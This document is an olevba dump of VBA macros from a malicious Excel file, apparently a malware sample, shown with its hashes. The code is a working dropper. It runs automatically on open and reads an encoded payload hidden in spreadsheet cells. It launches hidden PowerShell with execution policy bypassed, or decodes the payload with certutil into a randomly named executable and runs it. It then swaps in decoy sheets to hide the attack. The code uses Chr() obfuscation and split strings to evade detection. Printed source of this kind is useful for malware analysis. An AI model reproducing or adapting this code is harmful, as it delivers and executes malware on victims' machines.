Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Sub cBDo45Rt()
    Dim x As String
    x = GetVal(39910, 39911, 181)
    x = Replace(x, """", "\""")
    Dim c As String
    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
    s.Run c, 0
End Sub



Attribute VB_Name SHA1  
F6069977D0A2DAF29B31D0AEFDCDEF9B3EE6FD53
olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
OLE:MAS-HB-- e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210
===============================================================================
FILE: e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210 - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja1.cls 
in file: e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Hoja1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hoja2.cls 
in file: e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210 - OLE stream: u'_VBA_PROJECT_CUR/VBA/Hoja2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO LinesOfBusiness.bas 
in file: e222774c51081a82a8af62413e3d750cb36689cd6611ec11eed1819a510a4210 - OLE stream: u'_VBA_PROJECT_CUR/VBA/LinesOfBusiness'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

#If VBA7 Then
    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
#Else
    Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#End If

Sub Auto_Open()

Dim WshShell
Dim WshProcEnv
Dim isx86
Dim process_architecture

Set WshShell = CreateObject("WScript.Shell")
Set WshProcEnv = WshShell.Environment("Process")

process_architecture = WshProcEnv("PROCESSOR_ARCHITECTURE")

If process_architecture = "x86" Then
    isx86 = WshProcEnv("PROCESSOR_ARCHITEW6432")
    If isx86 = "" Then
        isx86 = True
    Else
        isx86 = False
    End If
Else
    isx86 = False
End If
If (isx86) Then
    Call LinesOfBusiness.hksg0b5t
Else
    Call LinesOfBusiness.dQRSZmkA
End If

End Sub


Function GetVal(sr As Long, er As Long, c As Long)
    Dim x
    For i = sr To er
        x = x + Cells(i, c)
    Next
    GetVal = x
End Function


Function rndname()
    Dim r As String
    Dim i As Integer
    Randomize
    For i = 1 To 8
        If i Mod 2 = 0 Then
            r = Chr(Int((90 - 65 + 1) * Rnd + 65)) & r
        Else
            r = Int((9 * Rnd) + 1) & r
        End If
    Next i
    rndname = r
End Function


Function CopyDecoy()
    Dim ows As Worksheet
    Dim tws As Worksheet
    Dim rng As String
    Dim shape As Excel.shape
    
    Set ows = Sheets(1)
    Set tws = Sheets(2)
    ows.Unprotect Password:=""
    ows.Cells.Delete
    rng = "A1:IV1000"

    For Each shape In ows.Shapes
        shape.Delete
    Next
    
    ows.Range(rng).Value = tws.Range(rng).Value
End Function

Function CopyDecoy_2()
    For Each Sheet In Application.ActiveWorkbook.Sheets
        Sheet.Visible = True
    Next
    Application.ActiveWorkbook.Sheets(1).Delete
End Function

Sub cutil(code As String)
    Dim x As String
    Dim wsh As Object
    Set wsh = VBA.CreateObject("WScript.Shell")
    Dim waitOnReturn As Boolean: waitOnReturn = True
    Dim windowStyle As Integer: windowStyle = 0

    Application.DisplayAlerts = False

    If Len(code) > 1024 Then
        x = "-----BEG" & "IN CER" & "TIFICATE-----"
        x = x + vbNewLine
        x = x + code
        x = x + vbNewLine
        x = x + "-----E" & "ND CERTIF" & "ICATE-----"
        
        Dim path As String
        path = Application.UserLibraryPath & rndname & ".txt"
        expath = Application.UserLibraryPath & rndname & ".exe"
        expath_arg = expath & " /A"
        
        Set scr = CreateObject("Scripting.FileSy" & "stemObject")
        Set file = scr.CreateTextFile(path, True)
        file.Write x
        file.Close

        CopyDecoy_2

        wsh.Run "certu" & "til -decode " & path & " " & expath, windowStyle, waitOnReturn
        wsh.Run expath_arg, 0, False

        ActiveWorkbook.Save
    End If
End Sub


Sub hksg0b5t()
    Dim p As String
    p = GetVal(6601, 6729, 159)
    cutil (p)
End Sub


Sub dQRSZmkA()
    Dim p As String
    p = GetVal(5718, 5860, 166)
    cutil (p)
End Sub